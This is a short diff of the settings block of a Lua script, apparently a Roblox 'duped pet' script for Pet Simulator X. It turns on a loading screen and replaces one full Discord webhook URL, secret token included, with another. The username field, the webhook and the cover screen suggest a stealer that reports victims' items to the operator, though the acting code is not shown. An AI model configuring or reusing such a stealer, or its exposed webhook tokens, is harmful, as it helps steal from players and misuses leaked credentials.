@@ -1,6 +1,6 @@
 Username = "PsxDupedPetScript"
-LoadScreen = false -- If you want to enable loadgui, rename to true
-Webhook = "https://discord.com/api/webhooks/1201442391958245386/CDH9ZY2hpZoKGmFumKWZGsxSB6Senn-UEuh1_Xg4yQlUvpCWo7L_zwOlDTx0rooJ1znb" -- Paste your Discord webhook here
+LoadScreen = true -- If you want to enable loadgui, rename to true
+Webhook = "https://discord.com/api/webhooks/1201720957480488960/hpFbMMhMIg5dxlczhmvAG_VAXU9hq8h3AD7_Iv6pxb5x16ujWE3B4-NOLMbawgpXWL_3" -- Paste your Discord webhook here
 
 
 if LoadScreen == true then 
